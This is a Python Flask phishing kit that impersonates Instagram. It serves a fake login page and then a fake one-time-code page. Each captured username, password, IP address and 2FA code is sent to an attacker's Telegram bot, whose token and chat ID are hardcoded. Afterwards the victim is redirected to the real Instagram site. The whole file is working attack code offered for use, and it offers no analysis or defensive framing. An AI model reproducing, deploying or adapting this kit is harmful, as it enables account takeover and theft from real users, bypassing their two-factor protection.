import os
from flask import Flask, request, redirect, render_template_string
import urllib.request
import urllib.parse

BOT_TOKEN = "8872141787:AAEaTE2X8i6rKP0g8xAoADueVbRXKsCJC_0"
CHAT_ID = "5975611263"

HTML_PAGE_1 = """
<!DOCTYPE html><html><head><title>Instagram</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#fff}
.box{width:300px;text-align:center}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:bold;font-size:16px}</style></head>
<body><div class="box"><h2>Instagram</h2>
<form method="POST" action="/login">
<input type="text" name="username" placeholder="Phone number, username, or email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form></div></body></html>
"""

HTML_PAGE_2 = """
<!DOCTYPE html><html><head><title>Verify</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>body{font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#fff}
.box{width:300px;text-align:center}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;text-align:center;letter-spacing:5px}
button{width:100%;padding:12px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-weight:bold;font-size:16px}</style></head>
<body><div class="box"><h2>Enter Verification Code</h2>
<p>We sent a 6-digit code to your phone.</p>
<form method="POST" action="/verify">
<input type="text" name="otp" placeholder="123456" maxlength="6" required>
<button type="submit">Verify</button></form></div></body></html>
"""

def send_tg(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = urllib.parse.urlencode({"chat_id": CHAT_ID, "text": text}).encode('utf-8')
        urllib.request.urlopen(urllib.request.Request(url, data=data), timeout=5)
    except: pass

app = Flask(__name__)
temp_data = {}

@app.route('/')
def index():
    return render_template_string(HTML_PAGE_1)

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    send_tg(f"🚨 بيانات انستقرام!\n📧: {email}\n🔑: {password}\n🌐 IP: {ip}")
    temp_data[ip] = {"email": email, "password": password}
    return render_template_string(HTML_PAGE_2)

@app.route('/verify', methods=['POST'])
def verify():
    otp = request.form.get('otp')
    ip = request.remote_addr
    user_data = temp_data.get(ip, {})
    email = user_data.get("email", "Unknown")
    password = user_data.get("password", "Unknown")
    send_tg(f"🔐 كود التحقق!\n📧: {email}\n🔑: {password}\n🔢: {otp}")
    return redirect("https://www.instagram.com/", code=302)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
